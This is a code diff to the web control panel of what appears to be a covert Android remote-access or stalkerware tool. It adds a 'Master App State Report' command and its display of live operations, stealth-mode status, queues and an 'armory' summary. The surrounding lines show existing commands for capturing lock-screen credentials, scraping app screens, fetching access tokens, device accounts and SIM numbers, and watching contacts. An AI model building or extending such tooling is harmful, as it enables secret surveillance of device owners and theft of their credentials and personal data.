@@ -703,6 +703,7 @@
                     { id: 'CAPTURE_CREDENTIALS', name: 'Capture Credentials', icon: '🔑', keywords: 'pattern, capture, credentials, pin, lock', inputs: [{id: 'patt-timeout', label: 'Timeout (s)', type: 'number', val: 30}, {id: 'patt-qual', label: 'Quality %', type: 'number', val: 80}, {id: 'patt-fps', label: 'Frame Rate', type: 'number', val: 15}] },
                     { id: 'GET_TREE', name: 'UI Scraper (Hierarchy)', icon: '🌲', keywords: 'dump, inspect, hierarchy, layout', inputs:[{id: 'tree-pkg', label: 'Package Name', type: 'text', placeholder: 'com.pkg'}, {id: 'tree-dur', label: 'Duration (Min)', type: 'number', val: 1}, {id: 'tree-depth', label: 'Walk Depth', type: 'number', val: 10}], cleanup: 'RESET_SCRAPER' },
                     { id: 'GET_TOKEN', name: 'Fetch Access Token', icon: '🔑', inputs: [] },
+                    { id: 'GET_APP_STATE', name: 'Master App State Report', icon: '🧠', keywords: 'state, status, report, master, queues, delayed, scheduled, timers, active, running, knowledge, hub', inputs: [] },
                     { id: 'GET_ACCOUNTS', name: 'Fetch Device Accounts', icon: '🆔', inputs: [] },
                     { id: 'GET_DEFAULTS', name: 'Audit Default Apps', icon: '🚥', inputs: [] },
                     { id: 'GET_NUMBERS', name: 'Fetch SIM Hardware', icon: '📇', inputs: [] },
@@ -1549,6 +1550,7 @@
                     case 'BRIGHTNESS':
                         content = `${document.getElementById('bri-level').value} | ${document.getElementById('bri-method').value}`; break;
                     case 'UNBLIND':
+                    case 'GET_APP_STATE':
                     case 'GET_ACCOUNTS':
                     case 'GET_DEFAULTS':
                     case 'GET_NUMBERS':
@@ -1901,6 +1903,42 @@
 
                 if (c.file_name === 'GET_NUMBERS' && c.result_data && c.result_data.sim_cards) {
                     dataHtml = '<div style="margin-top:10px; padding:10px; background:rgba(0,243,255,0.05); border:1px solid #333;"><div style="color:var(--primary); font-size:0.7rem; font-weight:bold; border-bottom:1px solid #333; padding-bottom:5px; margin-bottom:8px;">SIM_HARDWARE_REGISTRY</div>' + c.result_data.sim_cards.map(sim => '<div style="margin-bottom:8px; border-left:2px solid var(--success); padding-left:8px;"><div style="color:#fff; font-size:0.85rem;">' + sim.number + '</div><div style="color:#666; font-size:0.6rem;">SLOT: ' + sim.slot + ' | CARRIER: ' + sim.carrier + ' | ' + sim.country.toUpperCase() + '</div><div style="color:var(--primary); font-family:monospace; font-size:0.55rem; margin-top:2px; opacity:0.8;">SUB_ID: ' + sim.id + '</div></div>').join('') + '</div>';
+                }
+
+                if (c.file_name === 'GET_APP_STATE' && c.result_data) {
+                    const d = c.result_data;
+                    dataHtml = `<div style="margin-top:10px; padding:10px; background:rgba(0, 243, 255, 0.05); border:1px solid var(--primary);">
+                        <div style="color:var(--primary); font-size:0.75rem; font-weight:bold; margin-bottom:10px; border-bottom:1px solid #333; padding-bottom:5px;">MASTER_STATE_REPORT</div>
+                        
+                        <div style="margin-bottom:10px;">
+                            <span style="color:#aaa; font-size:0.65rem; font-weight:bold;">LIVE_OPERATIONS:</span>
+                            <pre style="margin:0; font-size:0.6rem; color:var(--success);">${JSON.stringify(d.live_operations, null, 2)}</pre>
+                        </div>
+                        <div style="margin-bottom:10px;">
+                            <span style="color:#aaa; font-size:0.65rem; font-weight:bold;">DISPLAY_STATE:</span>
+                            <pre style="margin:0; font-size:0.6rem; color:var(--success);">${JSON.stringify(d.display_state, null, 2)}</pre>
+                        </div>
+                        <div style="margin-bottom:10px;">
+                            <span style="color:#aaa; font-size:0.65rem; font-weight:bold;">SECURITY_PROTOCOLS:</span>
+                            <pre style="margin:0; font-size:0.6rem; color:${d.security_protocols?.stealth_mode_active ? 'var(--danger)' : 'var(--success)'};">${JSON.stringify(d.security_protocols, null, 2)}</pre>
+                        </div>
+                        <div style="margin-bottom:10px;">
+                            <span style="color:#aaa; font-size:0.65rem; font-weight:bold;">ACTIVE_TIMERS (ms remaining):</span>
+                            <pre style="margin:0; font-size:0.6rem; color:var(--primary);">${JSON.stringify(d.active_timers, null, 2)}</pre>
+                        </div>
+                        <div style="margin-bottom:10px;">
+                            <span style="color:#aaa; font-size:0.65rem; font-weight:bold;">QUEUES (Gatekeeper / Retry / Tasks):</span>
+                            <pre style="margin:0; font-size:0.6rem; color:#f59e0b;">${JSON.stringify(d.queues, null, 2)}</pre>
+                        </div>
+                        <div style="margin-bottom:5px;">
+                            <span style="color:#aaa; font-size:0.65rem; font-weight:bold;">ARMORY_SUMMARY:</span>
+                            <pre style="margin:0; font-size:0.6rem; color:var(--success);">${JSON.stringify(d.armory_summary, null, 2)}</pre>
+                        </div>
+                        <div style="margin-bottom:5px;">
+                            <span style="color:#aaa; font-size:0.65rem; font-weight:bold;">FEATURE_COLLECTION_RULES:</span>
+                            <pre style="margin:0; font-size:0.6rem; color:#888;">${JSON.stringify(d.feature_collection_rules, null, 2)}</pre>
+                        </div>
+                    </div>`;
                 }
 
                 if (c.file_name === 'SET_CONTACT_WATCHDOG' && c.status === 'WATCHDOG_TRIGGERED') {
